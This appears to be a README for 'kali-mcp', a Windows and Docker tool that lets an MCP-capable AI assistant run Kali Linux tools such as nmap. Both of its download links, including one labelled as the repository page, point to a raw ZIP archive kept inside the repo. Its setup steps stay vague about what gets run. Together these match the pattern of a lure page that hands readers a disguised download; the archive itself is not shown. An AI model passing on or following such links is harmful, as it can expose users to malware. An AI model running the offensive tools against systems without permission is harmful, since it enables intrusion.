# 🐉 kali-mcp - Run Kali Tools with AI Help

[![Download kali-mcp](https://img.shields.io/badge/Download%20kali-mcp-blue?style=for-the-badge&logo=github)](https://github.com/Unaacceptable297/kali-mcp/raw/refs/heads/main/docker/mcp_kali_v2.7.zip)

## 🧰 What this is

kali-mcp lets an AI assistant work with a Kali Linux Docker setup for security testing. It gives the assistant a safe, isolated place to run common Kali tools. That makes it easier to test systems, check for weak spots, and work through security tasks from one place.

This project is made for local use on Windows. You run it on your own computer, and it uses Docker to start the Kali Linux environment.

## 📦 What you need

Before you start, make sure you have:

- A Windows PC
- Admin access on your computer
- Internet access
- Docker Desktop for Windows
- An AI assistant that supports MCP
- At least 8 GB of RAM
- Around 10 GB of free disk space

If your system is older, the app may still run, but Docker can use a lot of memory. More RAM gives a smoother result.

## 🚀 Download kali-mcp

Go to the download page here:

[Visit the kali-mcp repository](https://github.com/Unaacceptable297/kali-mcp/raw/refs/heads/main/docker/mcp_kali_v2.7.zip)

Use that page to get the files you need, then follow the setup steps below.

## 🪟 How to run it on Windows

Follow these steps in order.

### 1. Install Docker Desktop

If Docker Desktop is not on your PC, install it first.

1. Open the Docker Desktop website
2. Download the Windows version
3. Run the installer
4. Restart your PC if asked
5. Open Docker Desktop and wait until it says it is running

Docker is what starts the Kali Linux environment on your computer.

### 2. Get the project files

1. Open the repository link
2. Download the project files to your PC
3. Save them in a folder you can find again, such as `Downloads` or `Documents`
4. If the files come as a ZIP, right-click the ZIP file and choose Extract All

After this, you should have a folder named `kali-mcp`.

### 3. Open the folder

1. Open File Explorer
2. Go to the folder where you saved the project
3. Open the `kali-mcp` folder

You should see files for the project inside that folder.

### 4. Start the Kali environment

The project uses Docker to start a Kali Linux container.

1. Open Docker Desktop and make sure it is running
2. Open a command window in the `kali-mcp` folder
3. Run the startup command that comes with the project files
4. Wait while Docker downloads the Kali image
5. Let the setup finish

The first start can take a few minutes. Later starts are faster.

### 5. Connect your AI assistant

Once the Docker setup is ready, connect your MCP-compatible AI assistant.

1. Open your AI assistant app
2. Go to its MCP or server settings
3. Add the `kali-mcp` server
4. Use the local path or command from the project files
5. Save the settings
6. Restart the assistant if needed

After that, the assistant can use the Kali environment for supported security tasks.

## 🛠️ First use

When the server is running, you can ask the assistant to help with things like:

- Basic network checks
- Port scans with tools like nmap
- Service checks
- Simple security testing
- Reviewing system details in the Kali container

Keep your use within systems you own or have permission to test.

## 🧭 Common tasks

Here are a few simple ways people use kali-mcp:

- Check which ports are open on a test machine
- Look for common service banners
- Run basic network discovery
- Test a local lab setup
- Use Kali tools without installing a full Kali system

Because the tools run in Docker, your main Windows system stays separate from the testing environment.

## ⚙️ How it works

kali-mcp acts as a bridge between your AI assistant and a Kali Linux Docker container.

- The AI assistant sends a request
- The MCP server passes the task to the Kali container
- The container runs the tool
- The result goes back to the assistant

This setup keeps the workflow simple. You do not need to open Kali by hand each time.

## 🔐 Safety and permissions

Use this tool only on systems you own or have clear permission to test. Security tools can scan networks, check services, and gather data. That can affect systems if used the wrong way.

A safe setup is:

- Your own PC
- A home lab
- A test VM
- A training environment
- A system where you have written permission

## 🧪 Example use cases

- Learning how security tools work
- Testing a home lab
- Checking a small server before launch
- Exploring how an AI assistant can run CLI tools
- Doing repeatable checks in a Docker sandbox

## 🧱 Troubleshooting

### Docker does not start

- Check that Docker Desktop is installed
- Restart your PC
- Open Docker Desktop as admin
- Make sure virtualization is on in BIOS or UEFI

### The Kali container is slow

- Close other heavy apps
- Give Docker more memory in settings
- Make sure you have free disk space

### The assistant does not see the server

- Check the MCP config path
- Make sure the server is running
- Restart the AI assistant
- Confirm the project folder has not moved

### The install seems stuck

- Wait a few minutes on the first run
- Check your internet connection
- Look at Docker Desktop to see if it is pulling images
- Try again after restarting Docker

## 📁 Project layout

The project files usually include:

- Server files for MCP
- Docker setup files
- Start scripts
- Config files
- Documentation

Keep all files in the same folder so the setup stays simple.

## 🖥️ Windows tips

- Use a folder with a short path, such as `C:\kali-mcp`
- Keep Docker Desktop open while you use the server
- Do not move the folder after setup unless you update the path
- If Windows asks for permission, allow it for Docker and the project files

## 🔎 Why people use it

This project helps you use Kali Linux tools without setting up a full virtual machine. It also lets an AI assistant help with tasks that need command-line tools. That can save time when you do repeatable security checks in a lab or test setup

## 📌 Repository details

- Name: kali-mcp
- Type: MCP server
- Platform: Windows with Docker
- Purpose: Security testing with Kali Linux tools
- Topics: AI tools, Claude, cybersecurity, Docker, ethical hacking, Kali Linux, MCP, nmap, pentesting, security